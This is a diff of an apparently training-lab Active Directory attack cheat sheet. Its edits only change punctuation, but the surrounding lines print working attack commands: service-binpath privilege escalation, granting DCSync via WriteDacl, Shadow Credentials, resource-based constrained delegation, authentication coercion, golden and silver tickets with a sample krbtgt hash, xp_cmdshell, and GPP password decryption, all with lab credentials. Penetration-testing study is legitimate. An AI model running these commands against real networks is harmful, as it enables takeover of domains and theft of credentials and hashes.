@@ -177,14 +177,14 @@ PS C:\htb> Get-ADGroup -Identity "Backup Operators"
 PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"
 ```
 #### What These Groups Are Actually Worth
-Finding membership in one of these built-in groups is only half the job — know what it converts to. Server Operators can log on locally to a Domain Controller and reconfigure any service there, which is a straight path to SYSTEM:
+Finding membership in one of these built-in groups is only half the job: know what it converts to. Server Operators can log on locally to a Domain Controller and reconfigure any service there, which is a straight path to SYSTEM:
 ```
 PS C:\htb> sc.exe config <vulnerable-service> binpath= "cmd.exe /c net localgroup administrators forend /add"
 ```
 ```
 PS C:\htb> sc.exe start <vulnerable-service>
 ```
-Print Operators is not the same primitive — it doesn't get general service rights, just `SeLoadDriverPrivilege`. That's still a SYSTEM path, but via loading a kernel driver (a known-vulnerable signed driver, Capcom.sys-style) rather than the `sc config` trick above.
+Print Operators is not the same primitive: it doesn't get general service rights, just `SeLoadDriverPrivilege`. That's still a SYSTEM path, but via loading a kernel driver (a known-vulnerable signed driver, Capcom.sys-style) rather than the `sc config` trick above.
 ## PowerView
 ### Domain User Information (mmorgan example)
 PS C:\htb> Get-DomainUser -Identity sflowers -Domain outdated.htb | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
@@ -401,7 +401,7 @@ PS C:\> net group "Exchange Windows Permissions" /add <user>
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PincipalIndentity <useraddedtogroupwithWriteDaclprivleges> DCSync
 ```
 ### Account Operators -> DCSync (a concrete chain)
-The two bullets above aren't hypothetical — Account Operators is a common starting point for exactly this chain: Account Operators can add itself to Exchange Windows Permissions (the group referenced above), which by default holds WriteDacl on the domain object, which is then used to grant the compromised user DCSync rights.
+The two bullets above aren't hypothetical. Account Operators is a common starting point for exactly this chain: Account Operators can add itself to Exchange Windows Permissions (the group referenced above), which by default holds WriteDacl on the domain object, which is then used to grant the compromised user DCSync rights.
 ```
 net group "Exchange Windows Permissions" /add forend /domain
 ```
@@ -410,7 +410,7 @@ Add-DomainObjectAcl -TargetIdentity "DC=INLANEFREIGHT,DC=LOCAL" -PrincipalIdenti
 ```
 From here, proceed straight to the DCSync section below.
 ## Shadow Credentials
-Abuses write access to a principal's `msDS-KeyCredentialLink` attribute to add an attacker-controlled certificate for PKINIT, then converts that into the account's NT hash (UnPAC-the-Hash) — no password reset needed.
+Abuses write access to a principal's `msDS-KeyCredentialLink` attribute to add an attacker-controlled certificate for PKINIT, then converts that into the account's NT hash (UnPAC-the-Hash). No password reset needed.
 Windows, with Whisker:
 ```
 Whisker.exe add /target:forend
@@ -418,7 +418,7 @@ Whisker.exe add /target:forend
 ```
 Rubeus.exe asktgt /user:forend /certificate:<base64-cert> /password:<cert-password> /getcredentials
 ```
-Linux, with Certipy — one command does both the KeyCredentialLink write and the PKINIT/UnPAC-the-Hash conversion:
+Linux, with Certipy: one command does both the KeyCredentialLink write and the PKINIT/UnPAC-the-Hash conversion:
 ```
 certipy shadow auto -u forend@inlanefreight.local -p Klmcargo2 -account targetuser
 ```
@@ -434,7 +434,7 @@ Set-DomainRBCD -Identity TARGET-COMPUTER$ -DelegateFrom ATTACKERSYSTEM$
 ```
 Rubeus.exe s4u /user:ATTACKERSYSTEM$ /rc4:<attackersystem_nthash> /impersonateuser:administrator /msdsspn:cifs/target-computer.inlanefreight.local /ptt
 ```
-Linux — same idea with impacket/bloodyAD:
+Linux, same idea with impacket/bloodyAD:
 ```
 addcomputer.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -computer-name ATTACKERSYSTEM$ -computer-pass Passwd123!
 ```
@@ -458,7 +458,7 @@ SpoolSample.exe ACADEMY-EA-DC01 UNCONSTRAINED-HOST.INLANEFREIGHT.LOCAL
 ```
 Once Rubeus catches the DC's TGT, `/ptt` it and DCSync straight off it.
 ## Constrained Delegation (S4U2)
-A service account with `msDS-AllowedToDelegateTo` set can impersonate any user to that specific SPN via S4U2Self + S4U2Proxy — no target password needed, just the service account's hash or Kerberos keys.
+A service account with `msDS-AllowedToDelegateTo` set can impersonate any user to that specific SPN via S4U2Self + S4U2Proxy. No target password needed, just the service account's hash or Kerberos keys.
 ```
 Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
 ```
@@ -524,7 +524,7 @@ Same from Windows, with Mimikatz:
 ```
 mimikatz # kerberos::golden /user:administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2839110960-2093633156-2951976679 /krbtgt:88ad09182de639ccc6579eb0849751cf /ptt
 ```
-Silver Ticket is the quieter, narrower alternative — it only needs a *service* account's hash (not krbtgt), never touches the DC to validate, but only works against that one service:
+Silver Ticket is the quieter, narrower alternative: it only needs a *service* account's hash (not krbtgt), never touches the DC to validate, but only works against that one service:
 ```
 mimikatz # kerberos::golden /user:administrator /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2839110960-2093633156-2951976679 /target:dc01.inlanefreight.local /service:cifs /rc4:<service_account_nthash> /ptt
 ```
@@ -606,7 +606,7 @@ Enumerating our Rights on the System using xp_cmdshell
 xp_cmdshell whoami /priv
 ```
 ### Linked Server Abuse
-If xp_cmdshell isn't available (or we want to move to a different SQL instance), check for linked servers first — they're a common way to pivot between instances using existing trust rather than needing new creds.
+If xp_cmdshell isn't available (or we want to move to a different SQL instance), check for linked servers first. They're a common way to pivot between instances using existing trust rather than needing new creds.
 ```
 Get-SQLServerLink -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!"
 ```
@@ -707,7 +707,7 @@ python3 DFSCoerce.py -u forend -p Klmcargo2 172.16.5.225 172.16.5.5
 ```
 netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M coerce_plus -o LISTENER=172.16.5.225
 ```
-Scan for hosts worth targeting first — Spooler and EFS both need to be running for these to work:
+Scan for hosts worth targeting first: Spooler and EFS both need to be running for these to work:
 ```
 netexec smb 172.16.5.0/23 -u forend -p Klmcargo2 -M spooler
 ```
@@ -843,7 +843,7 @@ gpp_password
 crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 ```
 ### Manual Decryption
-No tool needed — cpassword is AES-encrypted with a static key Microsoft published in MS14-025, so it decrypts with a few lines of PowerShell:
+No tool needed. cpassword is AES-encrypted with a static key Microsoft published in MS14-025, so it decrypts with a few lines of PowerShell:
 ```powershell
 function Decrypt-GPPPassword {
     param([string]$Cpassword)
@@ -856,7 +856,7 @@ function Decrypt-GPPPassword {
     ($AES.CreateDecryptor()).TransformFinalBlock($Base64,0,$Base64.Length) | ForEach-Object { [System.Text.Encoding]::Unicode.GetString($_) }
 }
 ```
-Find the cpassword to feed it first — every GPP XML that stores one lives under SYSVOL. Pull the Policies tree down over SMB, then grep it locally:
+Find the cpassword to feed it first: every GPP XML that stores one lives under SYSVOL. Pull the Policies tree down over SMB, then grep it locally:
 ```
 smbclient //172.16.5.5/SYSVOL -U forend%Klmcargo2 -c 'prompt off; recurse on; cd INLANEFREIGHT.LOCAL\Policies; mget *'
 ```
